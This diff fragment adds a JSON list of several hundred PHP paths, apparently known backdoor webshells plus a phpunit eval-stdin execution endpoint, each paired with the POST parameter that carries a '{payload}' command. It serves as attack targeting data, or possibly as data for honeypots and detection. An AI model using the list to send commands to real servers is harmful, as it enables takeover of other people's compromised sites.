+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/Administrator.php": [
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        }
+    ],
+    "/diy.php": [
+        {
+            "post": {
+                "diyworld": "{payload}"
+            }
+        }
+    ],
+    "/super.php": [
+        {
+            "post": {
+                "super": "{payload}"
+            }
+        }
+    ],
+    "/xiaomo.php": [
+        {
+            "post": {
+                "mo": "{payload}"
+            }
+        }
+    ],
+    "/777.php": [
+        {
+            "post": {
+                "-77": "{payload}"
+            }
+        }
+    ],
+    "/godkey.php": [
+        {
+            "post": {
+                "godkey": "{payload}"
+            }
+        }
+    ],
+    "/5201314.php": [
+        {
+            "post": {
+                "5201314": "{payload}"
+            }
+        }
+    ],
+    "/yj.php": [
+        {
+            "post": {
+                "yj": "{payload}"
+            }
+        }
+    ],
+    "/repeat.php": [
+        {
+            "post": {
+                "tomkey": "{payload}"
+            }
+        }
+    ],
+    "/p.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/cere.php": [
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        }
+    ],
+    "/neko.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/infos.php": [
+        {
+            "post": {
+                "name": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "wenwen": "{payload}"
+            }
+        }
+    ],
+    "/666.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/general.php": [
+        {
+            "post": {
+                "f11": "{payload}"
+            }
+        }
+    ],
+    "/dexgp.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/cer.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/data.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "data": "{payload}"
+            }
+        }
+    ],
+    "/lanke.php": [
+        {
+            "post": {
+                "lanke": "{payload}"
+            }
+        }
+    ],
+    "/okokok.php": [
+        {
+            "post": {
+                "godkey": "{payload}"
+            }
+        }
+    ],
+    "/php.php": [
+        {
+            "post": {
+                "leng": "{payload}"
+            }
+        }
+    ],
+    "/Ss.php": [
+        {
+            "post": {
+                "none": "{payload}"
+            }
+        }
+    ],
+    "/123.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/xiaoyu.php": [
+        {
+            "post": {
+                "lx": "{payload}"
+            }
+        }
+    ],
+    "/linux.php": [
+        {
+            "post": {
+                "linux": "{payload}"
+            }
+        }
+    ],
+    "/wb.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/api.php": [
+        {
+            "post": {
+                "xiaoer": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "q1n9nbst": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "4": "{payload}"
+            }
+        }
+    ],
+    "/lost.php": [
+        {
+            "post": {
+                "lostwolf": "{payload}"
+            }
+        }
+    ],
+    "/fack.php": [
+        {
+            "post": {
+                "js": "{payload}"
+            }
+        }
+    ],
+    "/log.php": [
+        {
+            "post": {
+                "l": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/qwqw.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/ldw.php": [
+        {
+            "post": {
+                "cc123": "{payload}"
+            }
+        }
+    ],
+    "/hacly.php": [
+        {
+            "post": {
+                "hacly": "{payload}"
+            }
+        }
+    ],
+    "/zzk.php": [
+        {
+            "post": {
+                "xiaopang": "{payload}"
+            }
+        }
+    ],
+    "/xiaohei.php": [
+        {
+            "post": {
+                "xiaohei": "{payload}"
+            }
+        }
+    ],
+    "/fusheng.php": [
+        {
+            "post": {
+                "fusheng": "{payload}"
+            }
+        }
+    ],
+    "/s1.php": [
+        {
+            "post": {
+                "258": "{payload}"
+            }
+        }
+    ],
+    "/toor.php": [
+        {
+            "post": {
+                "qwer": "{payload}"
+            }
+        }
+    ],
+    "/win1.php": [
+        {
+            "post": {
+                "win": "{payload}"
+            }
+        }
+    ],
+    "/angge.php": [
+        {
+            "post": {
+                "angge": "{payload}"
+            }
+        }
+    ],
+    "/7.php": [
+        {
+            "post": {
+                "xiaoma": "{payload}"
+            }
+        }
+    ],
+    "/nuoxi.php": [
+        {
+            "post": {
+                "nuoxi": "{payload}"
+            }
+        }
+    ],
+    "/HX.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/erwa.php": [
+        {
+            "post": {
+                "erwa": "{payload}"
+            }
+        }
+    ],
+    "/.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/51314.php": [
+        {
+            "post": {
+                "wen": "{payload}"
+            }
+        }
+    ],
+    "/mobai.PHP": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/mo.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/yccc.php": [
+        {
+            "post": {
+                "yc": "{payload}"
+            }
+        }
+    ],
+    "/guai.php": [
+        {
+            "post": {
+                "nianshao": "{payload}"
+            }
+        }
+    ],
+    "/520.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/luoran.php": [
+        {
+            "post": {
+                "luoran233": "{payload}"
+            }
+        }
+    ],
+    "/987.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/ruii.php": [
+        {
+            "post": {
+                "Arui": "{payload}"
+            }
+        }
+    ],
+    "/erba.php": [
+        {
+            "post": {
+                "can": "{payload}"
+            }
+        }
+    ],
+    "/link.php": [
+        {
+            "post": {
+                "link": "{payload}"
+            }
+        }
+    ],
+    "/abc.php": [
+        {
+            "post": {
+                "xx": "{payload}"
+            }
+        }
+    ],
+    "/tianqi.php": [
+        {
+            "post": {
+                "q": "{payload}"
+            }
+        }
+    ],
+    "/no.php": [
+        {
+            "post": {
+                "yk": "{payload}"
+            }
+        }
+    ],
+    "/CCC.PHP": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/sanan.php": [
+        {
+            "post": {
+                "sanan": "{payload}"
+            }
+        }
+    ],
+    "/fx.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/hl.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/lr.php": [
+        {
+            "post": {
+                "admin123": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/xiaobin.php": [
+        {
+            "post": {
+                "xiaobin": "{payload}"
+            }
+        }
+    ],
+    "/asen.php": [
+        {
+            "post": {
+                "asen": "{payload}"
+            }
+        }
+    ],
+    "/ci.php": [
+        {
+            "post": {
+                "ping": "{payload}"
+            }
+        }
+    ],
+    "/xxxx.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/orange.php": [
+        {
+            "post": {
+                "orange": "{payload}"
+            }
+        }
+    ],
+    "/mysql.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/h156.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/vuln.php": [
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        }
+    ],
+    "/can.php": [
+        {
+            "post": {
+                "cans": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "can": "{payload}"
+            }
+        }
+    ],
+    "/juji.php": [
+        {
+            "post": {
+                "xise": "{payload}"
+            }
+        }
+    ],
+    "/sbkcb.php": [
+        {
+            "post": {
+                "76524114": "{payload}"
+            }
+        }
+    ],
+    "/shanzhi.php": [
+        {
+            "post": {
+                "ping": "{payload}"
+            }
+        }
+    ],
+    "/Moxin.PHP": [
+        {
+            "post": {
+                "moxin": "{payload}"
+            }
+        }
+    ],
+    "/log1.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/temp.php": [
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        }
+    ],
+    "/lmn.php": [
+        {
+            "post": {
+                "lmn": "{payload}"
+            }
+        }
+    ],
+    "/liangchen.php": [
+        {
+            "post": {
+                "liangchen": "{payload}"
+            }
+        }
+    ],
+    "/ganzhuolang.php": [
+        {
+            "post": {
+                "qq": "{payload}"
+            }
+        }
+    ],
+    "/v.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "v7": "{payload}"
+            }
+        }
+    ],
+    "/ljb.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/ppp.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "power": "{payload}"
+            }
+        }
+    ],
+    "/666666.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/1556189185.php": [
+        {
+            "post": {
+                "123456": "{payload}"
+            }
+        }
+    ],
+    "/CCCC.PHP": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/que.php": [
+        {
+            "post": {
+                "ping": "{payload}"
+            }
+        }
+    ],
+    "/02.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/meng.php": [
+        {
+            "post": {
+                "xiaobin": "{payload}"
+            }
+        }
+    ],
+    "/yc.php": [
+        {
+            "post": {
+                "yc": "{payload}"
+            }
+        }
+    ],
+    "/mutuba.php": [
+        {
+            "post": {
+                "lequ": "{payload}"
+            }
+        }
+    ],
+    "/qiqi11.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/g.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/dns.php": [
+        {
+            "post": {
+                "xx": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/kvast.php": [
+        {
+            "post": {
+                "kvast": "{payload}"
+            }
+        }
+    ],
+    "/taocishun.php": [
+        {
+            "post": {
+                "ping": "tressa",
+                "zO": "{payload}"
+            }
+        }
+    ],
+    "/lm.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/avast.php": [
+        {
+            "post": {
+                "avast": "{payload}"
+            }
+        }
+    ],
+    "/xixi.php": [
+        {
+            "post": {
+                "xixi": "{payload}"
+            }
+        }
+    ],
+    "/luoke.php": [
+        {
+            "post": {
+                "yumu": "{payload}"
+            }
+        }
+    ],
+    "/Pings.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/xh.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/ycc.php": [
+        {
+            "post": {
+                "yc": "{payload}"
+            }
+        }
+    ],
+    "/luoran6.php": [
+        {
+            "post": {
+                "luoranqwe..": "{payload}"
+            }
+        }
+    ],
+    "/sbkc.php": [
+        {
+            "post": {
+                "UnsjXEW=": "{payload}"
+            }
+        }
+    ],
+    "/tests.php": [
+        {
+            "post": {
+                "hadmin": "{payload}"
+            }
+        }
+    ],
+    "/jb.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/vf.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/duke.php": [
+        {
+            "post": {
+                "duke": "{payload}"
+            }
+        }
+    ],
+    "/jkl.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        }
+    ],
+    "/jiaochi.php": [
+        {
+            "post": {
+                "#": "{payload}"
+            }
+        }
+    ],
+    "/chaoda.php": [
+        {
+            "post": {
+                "chaoda": "{payload}"
+            }
+        }
+    ],
+    "/n24.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/linkr.php": [
+        {
+            "post": {
+                "linkr": "{payload}"
+            }
+        }
+    ],
+    "/llld.php": [
+        {
+            "post": {
+                "hacker": "{payload}"
+            }
+        }
+    ],
+    "/cnm.php": [
+        {
+            "post": {
+                "dsg456dsf": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "dong": "{payload}"
+            }
+        }
+    ],
+    "/alipay.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/nidage.php": [
+        {
+            "post": {
+                "wanan": "{payload}"
+            }
+        }
+    ],
+    "/vuln1.php": [
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        }
+    ],
+    "/bx.php": [
+        {
+            "post": {
+                "bx": "{payload}"
+            }
+        }
+    ],
+    "/Updata.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/linkx.php": [
+        {
+            "post": {
+                "linkx": "{payload}"
+            }
+        }
+    ],
+    "/key.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/zxc1.php": [
+        {
+            "post": {
+                "ggsmd": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "xxxxxx": "{payload}"
+            }
+        }
+    ],
+    "/gsy.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/iis.php": [
+        {
+            "post": {
+                "wanmei": "{payload}"
+            }
+        }
+    ],
+    "/shi.php": [
+        {
+            "post": {
+                "ud": "{payload}"
+            }
+        }
+    ],
+    "/sqlk.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/autoloader.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/.git.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/dashu.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/secure1.php": [
+        {
+            "post": {
+                "tt@test": "{payload}"
+            }
+        }
+    ],
+    "/MCLi.php": [
+        {
+            "post": {
+                "ope": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "4": "{payload}"
+            }
+        }
+    ],
+    "/ok.php": [
+        {
+            "post": {
+                "oker": "{payload}"
+            }
+        }
+    ],
+    "/zxc2.php": [
+        {
+            "post": {
+                "xxxxxx": "{payload}"
+            }
+        }
+    ],
+    "/bn.php": [
+        {
+            "post": {
+                "bf520": "{payload}"
+            }
+        }
+    ],
+    "/ww.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "ww": "{payload}"
+            }
+        }
+    ],
+    "/ce.PHP": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/webconfig.php": [
+        {
+            "post": {
+                "woshimima": "{payload}"
+            }
+        }
+    ],
+    "/zxy.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "555": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "888": "{payload}"
+            }
+        }
+    ],
+    "/info.php": [
+        {
+            "post": {
+                "-7": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/errors.php": [
+        {
+            "post": {
+                "garry": "{payload}"
+            }
+        }
+    ],
+    "/6.php": [
+        {
+            "post": {
+                "1337": "{payload}"
+            }
+        }
+    ],
+    "/think.php": [
+        {
+            "post": {
+                "aaa": "{payload}"
+            }
+        }
+    ],
+    "/xiaoxi.php": [
+        {
+            "post": {
+                "xise": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/oumi.php": [
+        {
+            "post": {
+                "pass": "{payload}"
+            }
+        }
+    ],
+    "/cs.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/DJ.php": [
+        {
+            "post": {
+                "4": "{payload}"
+            }
+        }
+    ],
+    "/code.php": [
+        {
+            "post": {
+                "code": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/web.php": [
+        {
+            "post": {
+                "aw": "{payload}"
+            }
+        }
+    ],
+    "/yyx.php": [
+        {
+            "post": {
+                "857541956": "{payload}"
+            }
+        }
+    ],
+    "/mybestloves.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/cadre.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/.config.php": [
+        {
+            "post": {
+                "2333": "{payload}"
+            }
+        }
+    ],
+    "/zyc.php": [
+        {
+            "post": {
+                "zyc": "{payload}"
+            }
+        }
+    ],
+    "/fuck.php": [
+        {
+            "post": {
+                "fuck": "{payload}"
+            }
+        }
+    ],
+    "/lx.php": [
+        {
+            "post": {
+                "lx": "{payload}"
+            }
+        }
+    ],
+    "/ysy.php": [
+        {
+            "post": {
+                "ysy": "{payload}"
+            }
+        }
+    ],
+    "/indexa.php": [
+        {
+            "post": {
+                "ggbb": "{payload}"
+            }
+        }
+    ],
+    "/anyi.php": [
+        {
+            "post": {
+                "miao": "{payload}"
+            }
+        }
+    ],
+    "/wuwu.php": [
+        {
+            "post": {
+                "123": "{payload}"
+            }
+        }
+    ],
+    "/xiong.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/test404.php": [
+        {
+            "post": {
+                "zs": "{payload}"
+            }
+        }
+    ],
+    "/fans.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/Config_Shell.php": [
+        {
+            "post": {
+                "b4dboy": "{payload}"
+            }
+        }
+    ],
+    "/temtel.php": [
+        {
+            "post": {
+                "188": "{payload}"
+            }
+        }
+    ],
+    "/1111.php": [
+        {
+            "post": {
+                "111": "{payload}"
+            }
+        }
+    ],
+    "/lanyecn.php": [
+        {
+            "post": {
+                "zhike": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/ll.php": [
+        {
+            "post": {
+                "tt@test": "{payload}"
+            }
+        }
+    ],
+    "/ganshiqiang.php": [
+        {
+            "post": {
+                "ping": "{payload}"
+            }
+        }
+    ],
+    "/function.inc.php": [
+        {
+            "post": {
+                "struggle": "{payload};"
+            },
+            "encoding": "base64"
+        }
+    ],
+    "/bf.php": [
+        {
+            "post": {
+                "bf520": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "bf": "{payload}"
+            }
+        }
+    ],
+    "/paylog.php": [
+        {
+            "post": {
+                "xiao": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "20208": "{payload}"
+            }
+        }
+    ],
+    "/fantao.php": [
+        {
+            "post": {
+                "2": "{payload}"
+            }
+        }
+    ],
+    "/go.php": [
+        {
+            "post": {
+                "12345": "{payload}"
+            }
+        }
+    ],
+    "/info1.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/lequ.php": [
+        {
+            "post": {
+                "lequ": "{payload}"
+            }
+        }
+    ],
+    "/vulnspy.php": [
+        {
+            "post": {
+                "vulnspy": "{payload}"
+            }
+        }
+    ],
+    "/config.inc.php": [
+        {
+            "post": {
+                "1023": "{payload}"
+            }
+        }
+    ],
+    "/buluya.php": [
+        {
+            "post": {
+                "ping": "{payload}"
+            }
+        }
+    ],
+    "/wanmei.php": [
+        {
+            "post": {
+                "wanmei": "{payload}"
+            }
+        }
+    ],
+    "/qiangkezhi.php": [
+        {
+            "post": {
+                "ping": "{payload}"
+            }
+        }
+    ],
+    "/shipu.php": [
+        {
+            "post": {
+                "sss": "{payload}"
+            }
+        }
+    ],
+    "/fb.php": [
+        {
+            "post": {
+                "guess": "{payload}"
+            }
+        }
+    ],
+    "/aaaaaa1.php": [
+        {
+            "post": {
+                "bbbbbb": "{payload}"
+            }
+        }
+    ],
+    "/51.php": [
+        {
+            "post": {
+                "username": "{payload}"
+            }
+        }
+    ],
+    "/cn.php": [
+        {
+            "post": {
+                "cd123": "{payload}"
+            }
+        }
+    ],
+    "/phpinf0.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/aotian.php": [
+        {
+            "post": {
+                "aotian": "{payload}"
+            }
+        }
+    ],
+    "/zxc.php": [
+        {
+            "post": {
+                "sean": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "xxxxxx": "{payload}"
+            }
+        }
+    ],
+    "/phplil.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/test123.php": [
+        {
+            "post": {
+                "qwer": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/jing.php": [
+        {
+            "post": {
+                "xise": "{payload}"
+            }
+        }
+    ],
+    "/secure.php": [
+        {
+            "post": {
+                "admin@221": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "tt@test": "{payload}"
+            }
+        }
+    ],
+    "/xs.php": [
+        {
+            "post": {
+                "729448908": "{payload}"
+            }
+        }
+    ],
+    "/back.php": [
+        {
+            "post": {
+                "fuck": "{payload}"
+            }
+        }
+    ],
+    "/1ndex.php": [
+        {
+            "post": {
+                "fuck": "{payload}"
+            }
+        }
+    ],
+    "/ml.php": [
+        {
+            "post": {
+                "molu": "{payload}"
+            }
+        }
+    ],
+    "/class1.php": [
+        {
+            "post": {
+                "112": "{payload}"
+            }
+        }
+    ],
+    "/user.php": [
+        {
+            "post": {
+                "wanmei": "{payload}"
+            }
+        }
+    ],
+    "/cron.php": [
+        {
+            "post": {
+                "test233": "{payload}"
+            }
+        }
+    ],
+    "/info8.php": [
+        {
+            "post": {
+                "ok": "{payload}"
+            }
+        }
+    ],
+    "/xx33.php": [
+        {
+            "post": {
+                "xx": "{payload}"
+            }
+        }
+    ],
+    "/zxc0.php": [
+        {
+            "post": {
+                "xxxxxx": "{payload}"
+            }
+        }
+    ],
+    "/fdgq.php": [
+        {
+            "post": {
+                "lequ": "{payload}"
+            }
+        }
+    ],
+    "/inc.php": [
+        {
+            "post": {
+                "0": "{payload}"
+            }
+        }
+    ],
+    "/n23.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/index1.php": [
+        {
+            "post": {
+                "q1n9nbst": "{payload}"
+            }
+        }
+    ],
+    "/inde.php": [
+        {
+            "post": {
+                "adminlz": "{payload}"
+            }
+        }
+    ],
+    "/Hzllaga.php": [
+        {
+            "post": {
+                "Hzllaga": "{payload}"
+            }
+        }
+    ],
+    "/coon.php": [
+        {
+            "post": {
+                "sb": "{payload}"
+            }
+        }
+    ],
+    "/userr.php": [
+        {
+            "post": {
+                "usrr": "{payload}"
+            }
+        }
+    ],
+    "/pop.php": [
+        {
+            "post": {
+                "m": "{payload}"
+            }
+        }
+    ],
+    "/wulv.php": [
+        {
+            "post": {
+                "tmp": "{payload}"
+            }
+        }
+    ],
+    "/up.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/gg.php": [
+        {
+            "post": {
+                "a": "{payload}"
+            }
+        }
+    ],
+    "/soga.php": [
+        {
+            "post": {
+                "sose": "{payload}"
+            }
+        }
+    ],
+    "/1q.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/qqq.php": [
+        {
+            "post": {
+                "520": "{payload}"
+            }
+        },
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/d.php": [
+        {
+            "post": {
+                "e": "{payload}"
+            }
+        }
+    ],
+    "/xiaomi.php": [
+        {
+            "post": {
+                "xiaomi": "{payload}"
+            }
+        }
+    ],
+    "/qunhuang.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/xmlrpc.php": [
+        {
+            "post": {
+                "Magento": "{payload}"
+            }
+        }
+    ],
+    "/plus/laobiao.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/images/entyy.php": [
+        {
+            "post": {
+                "xixi": "{payload}"
+            }
+        }
+    ],
+    "/aojiao.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/15.php": [
+        {
+            "post": {
+                "username": "{payload}"
+            }
+        }
+    ],
+    "/plus/xsvip.php": [
+        {
+            "post": {
+                "xinsui": "{payload}"
+            }
+        }
+    ],
+    "/plus/ma.php": [
+        {
+            "post": {
+                "dajihi": "{payload}"
+            }
+        }
+    ],
+    "/12345.php": [
+        {
+            "post": {
+                "12345": "{payload}"
+            }
+        }
+    ],
+    "/images/1ndex.php": [
+        {
+            "post": {
+                "handle": "{payload}"
+            }
+        }
+    ],
+    "/plus/dajihi.php": [
+        {
+            "post": {
+                "dajihi": "{payload}"
+            }
+        }
+    ],
+    "/errors/processor.php": [
+        {
+            "post": {
+                "Magento": "{payload}"
+            }
+        }
+    ],
+    "/images/asp.php": [
+        {
+            "post": {
+                "itongtong": "{payload}"
+            }
+        }
+    ],
+    "/plus/tou.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/images/defau1t.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/include/tags.php": [
+        {
+            "post": {
+                "z": "tressa",
+                "z0": "{payload}"
+            }
+        }
+    ],
+    "/datas.php": [
+        {
+            "post": {
+                "CL": "{payload}"
+            }
+        }
+    ],
+    "/administrator/webconfig.txt.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/plus/e7xue.php": [
+        {
+            "post": {
+                "e7xue": "{payload}"
+            }
+        }
+    ],
+    "/images/swfupload/tags.php": [
+        {
+            "post": {
+                "z": "tressa",
+                "z0": "{payload}"
+            }
+        }
+    ],
+    "/plus/canshi.php": [
+        {
+            "post": {
+                "@123": "{payload}"
+            }
+        }
+    ],
+    "/4o4.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/plus/mybak.php": [
+        {
+            "post": {
+                "mybak": "{payload}"
+            }
+        }
+    ],
+    "/zhui.php": [
+        {
+            "post": {
+                "cmd09": "{payload}"
+            }
+        }
+    ],
+    "/ji.php": [
+        {
+            "post": {
+                "blbl": "{payload}"
+            }
+        }
+    ],
+    "/include/data/tags.php": [
+        {
+            "post": {
+                "z": "tressa",
+                "z0": "{payload}"
+            }
+        }
+    ],
+    "/xun.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/about.php": [
+        {
+            "post": {
+                "1q2w3e4r": "{payload}"
+            }
+        }
+    ],
+    "/test1.php": [
+        {
+            "post": {
+                "cmd": "{payload}"
+            }
+        }
+    ],
+    "/plus/lucas.php": [
+        {
+            "post": {
+                "ls": "{payload}"
+            }
+        }
+    ],
+    "/incs.php": [
+        {
+            "post": {
+                "cmd@121121": "{payload}"
+            }
+        }
+    ],
+    "/hannan.php": [
+        {
+            "post": {
+                "lequ": "{payload}"
+            }
+        }
+    ],
+    "/plus/bakup.php": [
+        {
+            "post": {
+                "mb": "{payload}"
+            }
+        }
+    ],
+    "/queqiao.php": [
+        {
+            "post": {
+                "xc99": "{payload}"
+            }
+        }
+    ],
+    "/guipu.php": [
+        {
+            "post": {
+                "360": "{payload}"
+            }
+        }
+    ],
+    "/slider.php": [
+        {
+            "post": {
+                "tom": "{payload}"
+            }
+        }
+    ],
+    "/blog/xmlrpc.php": [
+        {
+            "post": {
+                "Magento": "{payload}"
+            }
+        }
+    ],
+    "/luso.php": [
+        {
+            "post": {
+                "abc": "{payload}"
+            }
+        }
+    ],
+    "/igo.php": [
+        {
+            "post": {
+                "admin": "{payload}"
+            }
+        }
+    ],
+    "/plus/mytag.php": [
+        {
+            "post": {
+                "dajihi": "{payload}"
+            }
+        }
+    ],
+    "/plus/90sec.php": [
+        {
+            "post": {
+                "guige": "{payload}"
+            }
+        }
+    ],
+    "/images/1.php": [
+        {
+            "post": {
+                "itongtong": "{payload}"
+            }
+        }
+    ],
+    "/plus/service.php": [
+        {
+            "post": {
+                "fuwu": "{payload}"
+            }
+        }
+    ],
+    "/indexbak.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/dong.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php": [
+        {
+            "post": {
+                "<?": "{payload}"
+            }
+        }
+    ],
+    "/plus/yunjitan.php": [
+        {
+            "post": {
+                "tmp": "{payload}"
+            }
+        }
+    ],
+    "/plus/gu.php": [
+        {
+            "post": {
+                "c": "{payload}"
+            }
+        }
+    ],
+    "/webconfig.txt.php": [
+        {
+            "post": {
+                "1": "{payload}"
+            }
+        }
+    ],
+    "/plus/laobiaoaien.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/159.php": [
+        {
+            "post": {
+                "username": "{payload}"
+            }
+        }
+    ],
+    "/confie.php": [
+        {
+            "post": {
+                "page": "{payload}"
+            }
+        }
+    ],
+    "/plus/moon.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/xing.php": [
+        {
+            "post": {
+                "blbl": "{payload}"
+            }
+        }
+    ],
+    "/plus/read.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ],
+    "/plus/shaoyong.php": [
+        {
+            "post": {
+                "x": "{payload}"
+            }
+        }
+    ]
+}
